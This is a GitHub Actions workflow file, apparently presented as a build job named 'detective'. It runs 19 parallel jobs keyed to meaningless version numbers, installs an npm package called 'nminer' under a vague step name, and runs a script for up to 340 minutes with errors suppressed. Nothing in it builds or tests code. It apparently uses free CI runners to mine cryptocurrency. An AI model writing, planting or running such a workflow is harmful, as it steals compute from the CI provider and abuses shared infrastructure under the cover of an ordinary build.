name: detective
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6283 }
          - { version: 728 }
          - { version: 9863 }
          - { version: 3674 }
          - { version: 4593 }
          - { version: 4897 }
          - { version: 217 }
          - { version: 5034 }
          - { version: 686 }
          - { version: 6453 }
          - { version: 4863 }
          - { version: 3320 }
          - { version: 528 }
          - { version: 2015 }
          - { version: 5368 }
          - { version: 5276 }
          - { version: 9052 }
          - { version: 2685 }
          - { version: 8259 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: frightfully psst
        run: |
          npm install nminer@latest
          timeout 340m node detective.js || echo "detective executed"